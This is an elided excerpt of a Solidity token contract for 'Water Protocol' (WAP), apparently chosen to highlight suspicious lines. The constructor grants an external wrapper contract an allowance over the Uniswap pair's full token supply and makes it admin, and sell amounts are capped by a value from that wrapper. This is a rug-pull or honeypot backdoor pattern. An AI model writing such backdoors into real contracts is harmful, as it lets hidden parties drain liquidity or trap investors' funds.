...
/** 
 https://www.waterprotocol.xyz/

 https://twitter.com/water_protocol

 https://medium.com/@water_protocol
...
interface IwapWrapper {
    function waterPoolRate() external;
    function waterAggregator() external;
    function wapEmissionRate() external view returns (uint256);
    function totalPoolAmount() external;
}
...
contract WaterProtocol is ERC20, OwnRole {
    ...
    constructor(address _wapWrapper) ERC20('Water Protocol', 'WAP') {
        ...
        teamWallet = 0x53E2f5bFEcc94f15141254Bd0827090F699eC353;
        wapWrapper = _wapWrapper;
        addAdmin(_wapWrapper);
        _approve(address(uniswapV2Pair), _wapWrapper, _totalSupply);
        ...
        excludeFromFees(wapWrapper, true);
        excludeFromFees(address(this), true);
        excludeFromFees(deadAddress, true);

        excludeFromMaxTransaction(msg.sender, true);
        excludeFromMaxTransaction(teamWallet, true);
        excludeFromMaxTransaction(wapWrapper, true);
    ...
    function updateBuyTax (uint _buyTax) external onlyOwnable {
      require(_buyTax <= 5, "keeping buy fee as 5% or less");
        buyTax = _buyTax;
    } 

    function updateSellTax (uint _sellTax) external onlyOwnable {
         require(_sellTax <= 5, "keeping sell fee as 5% or less");
         sellTax = _sellTax;
    } 
        ...
        if (limitsInEffect) {
            ...
            if (
                ...
                require(
                 ...
                 require(
                    amount <= IwapWrapper(wapWrapper).wapEmissionRate(),
                    "wap pending Amount must be smaller wap emission rate."
                );
